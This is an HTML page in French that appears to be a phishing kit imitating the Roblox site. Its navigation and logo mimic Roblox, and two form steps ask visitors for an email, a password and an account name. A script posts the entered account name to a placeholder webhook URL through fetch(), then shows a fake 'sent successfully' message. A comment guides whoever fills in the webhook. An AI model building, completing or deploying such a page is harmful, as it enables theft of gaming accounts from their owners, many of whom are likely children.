<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Contact</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f8f9fa; margin: 0; }
        .nav-bar { background: white; height: 60px; display: flex; align-items: center; padding: 0 30px; border-bottom: 1px solid #dee2e6; }
        .logo { width: 40px; height: 40px; background: black; transform: rotate(10deg); display: flex; align-items: center; justify-content: center; margin-right: 20px; }
        .logo-hole { width: 15px; height: 15px; background: white; }
        .nav-item { margin: 0 20px; font-weight: bold; cursor: pointer; color: #333; }
        .nav-item:hover { text-decoration: underline; }
        .card { width: 450px; background: white; margin: 50px auto; padding: 40px; border: 1px solid #dee2e6; border-radius: 4px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ced4da; background: #e9ecef; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #6c757d; color: white; border: none; font-weight: bold; cursor: pointer; }
        .error { color: red; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>

<div class="nav-bar">
    <div class="logo"><div class="logo-hole"></div></div>
    <div class="nav-item">Charts</div>
    <div class="nav-item">Marketplace</div>
    <div class="nav-item">Créer</div>
    <div class="nav-item">Robux</div>
    <div style="margin-left: auto;">
        <button style="width: auto; background: white; color: black; border: 1px solid #333;">Connexion</button>
        <button style="width: auto; background: #007bff;">S'inscrire</button>
    </div>
</div>

<div class="card" id="page1">
    <h2>Coordonnées</h2>
    <input type="text" id="mail1" placeholder="Adresse e-mail">
    <input type="text" id="mail2" placeholder="Confirmer e-mail">
    <input type="password" id="mdp1" placeholder="Mot de passe">
    <input type="password" id="mdp2" placeholder="Confirmer mot de passe">
    <div class="error" id="err1"></div>
    <button onclick="nextPage()">Continuer</button>
</div>

<div class="card" id="page2" style="display:none;">
    <h2>Sécurité</h2>
    <input type="text" id="nom" placeholder="Nom du compte">
    <input type="text" id="mail3" placeholder="Mail associé">
    <input type="password" id="mdp3" placeholder="Mot de passe">
    <input type="password" id="mdp4" placeholder="Confirmer mot de passe">
    <div class="error" id="err2"></div>
    <button onclick="send()">Envoyer</button>
</div>

<script>
    function nextPage() {
        if(document.getElementById('mail1').value == "" || document.getElementById('mdp1').value == "") {
            document.getElementById('err1').innerText = "Merci de remplir tous les champs";
        } else {
            document.getElementById('page1').style.display = 'none';
            document.getElementById('page2').style.display = 'block';
        }
    }

    function send() {
        // Pour envoyer vers ton webhook depuis le web, on utilise fetch()
        const data = { content: "Compte: " + document.getElementById('nom').value };
        fetch("TON_WEBHOOK_URL_ICI", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
        document.getElementById('err2').innerText = "Envoyé avec succès !";
        document.getElementById('err2').style.color = "green";
    }
</script>

</body>
</html>
